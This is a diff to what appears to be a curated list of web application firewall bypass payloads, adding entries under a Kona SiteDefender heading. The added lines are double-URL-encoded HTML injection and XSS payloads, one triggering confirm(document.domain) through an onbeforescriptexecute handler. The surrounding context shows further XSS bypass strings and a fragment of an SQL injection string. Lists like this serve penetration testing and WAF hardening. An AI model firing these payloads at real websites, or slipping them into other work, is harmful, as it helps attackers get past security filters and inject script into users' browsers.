@@ -2971,6 +2971,10 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
 ### Kona SiteDefender
+- HTML Injection by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+```
+%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
+```
 - XSS Bypass by [@zseano](https://twitter.com/zseano)
 ```
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
@@ -2978,6 +2982,10 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
 ```
 <abc/onmouseenter=confirm%60%60>
+```
+- [XSS Bypass](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+```
+%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
 ```
 
 ### Profense
